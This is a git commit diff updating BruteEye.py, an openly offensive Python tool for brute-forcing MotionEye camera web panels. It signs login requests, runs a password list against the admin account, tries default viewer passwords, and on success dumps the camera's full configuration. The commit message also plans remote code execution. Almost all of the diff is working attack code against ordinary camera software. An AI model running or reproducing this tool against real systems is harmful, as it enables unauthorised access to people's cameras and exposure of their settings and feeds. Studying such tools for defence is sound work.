96b2f9537370176152da8b90553cbc2e32d92860
RedHeadSec <42355245+RedHeadSec@users.noreply.github.com>
2022-12-09 18:11:46 -0600

    Version 1.1
    Standard viewer checks for user:user and user:<blank>
    Progress bar instead of password output
    Dump full camera configuration
    
    TODO:
    Get and Save config settings
    RCE via Camera Motion

--- BruteEye.py
+++ BruteEye.py
@@ -1,8 +1,9 @@
 import requests
 import argparse
 import pyfiglet
-import time
+import time,json
 import hashlib
+from tqdm import tqdm
 from datetime import datetime
 from bs4 import BeautifulSoup
 
@@ -13,20 +14,24 @@ print(banner+'\nAuthor: Evasive_Ginger/RedHeadSec\n')
 parser = argparse.ArgumentParser(description="A tool for brute forcing MotionEye camera web panels.")
 parser.add_argument("target", help="Enter the target host. EX: http://192.168.254.149:8765", type=str)
 parser.add_argument("password_list", help="Enter the path for the password list.", type=str)
-parser.add_argument("-p", "--port", default='8765',help="Port running MotoionEye web console.",type=str)
+parser.add_argument("-p", "--port", default='8765',help="Port running MotoionEye web console.",type=str) 
 parser.add_argument("-d","--delay", help="Apply sleep limiting for X seconds/ms. Example: 0.5",default=0,type=float)
 args = parser.parse_args()
 
+
+
+
 #Tested with version 0.36.1
-#Tested with version 0.42
 username = 'admin' # As of 0.42, the admin user can not be changed via GUI (Can be via config file). May be different for modified environments!
 # The username is passed to the client via HTLM to be parsed by client-side JS, so it is leaked for you.
-version = '1.0'
-ssl = None
+version = '1.1'
+ssl = None #Unused currently
 pass_file = open(args.password_list,'r')
 pass_line = pass_file.readlines()
 
-def logger(func):
+
+
+def logger(func): 
 	def wrapper():
 		print("Version: {}".format(version))
 		print("-"*50)
@@ -58,33 +63,53 @@ def sendRequest(target,username,password):
 	sig = computeSignature(path,sha1Pass(password)).hexdigest()
 	url = 'http://'+target+':'+args.port+'/login/?_='+str(epoch)+'&_username=admin&_login=true&_signature='+str(sig)
 	req = requests.get(url,headers=headers)
-
 	# Pull config as confirmation if valid
 	if req.status_code == 200 and req.text == '{}':
-		epoch2 = get_epoch()
-		path2 = '/config/main/get/?_='+str(epoch)+'&_username=admin'
-		sig2 = computeSignature(path2,sha1Pass(password)).hexdigest()
-		config_url = 'http://'+target+':'+args.port+'/config/main/get/?_='+str(epoch2)+'&_username=admin&_signature='+str(sig2)
 		print("Success with "+password+"! Dumping Configuration: ")
+		epoch2 = get_epoch()
+		path2 = '/config/list/?_='+str(epoch)+'&_username=admin'
+		sig2 = computeSignature(path2,sha1Pass(password)).hexdigest()
+		config_url = 'http://'+target+':'+args.port+'/config/list/?_='+str(epoch2)+'&_username=admin&_signature='+str(sig2)
 		config_req = requests.get(config_url,headers=headers)
-		print(config_req.text)
+		config_dict = config_req.json()
+		print (json.dumps(config_dict, indent=2, default=str))
 		exit()
 	else:
 		time.sleep(args.delay)
 		pass
 
+def checkUserAccount(target,username):
+	useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36"
+	headers={"User-Agent": useragent}
+	user_passwords = ['user',''] #Common default user passwords seen in the wild
+	for password in user_passwords:
+		epoch = get_epoch()
+		path = '/login/?_='+str(epoch)+'&_login=true&_username=user'
+		sig = computeSignature(path,sha1Pass(password)).hexdigest()
+		url = 'http://'+target+':'+args.port+'/login/?_='+str(epoch)+'&_username=user&_login=true&_signature='+str(sig)
+		req = requests.get(url,headers=headers)
+		print("Checking password for user:"+password)
+		if req.status_code == 200 and req.text == '{}':
+			print("\nUser account is accessable  with: user:"+password)
+			print("If no password is shown, then it is blank.\n")
+			break
+		else:
+			pass
+
+
 @logger
 def main():
-	print("Running BruteEye!")
-	for password in pass_line:
-		try:
-			print("Attempting password: "+password.strip())
+	try:
+		print("Running BruteEye!\nChecking for basic user access...")
+		checkUserAccount(args.target,'user')
+		print("\nRunning admin brute force...\n")
+		for password  in tqdm(pass_line, desc="Password Guessing..."):
 			sendRequest(args.target,username,password.strip())
 
-		except KeyboardInterrupt:
-			print("\nUser aborted process!")
-			exit()
-		except Exception as e:
-			print(e)
-
+	except KeyboardInterrupt:
+		print("\nUser aborted process!")
+		exit()
+	except Exception as e:
+		print(e)
 main()
+
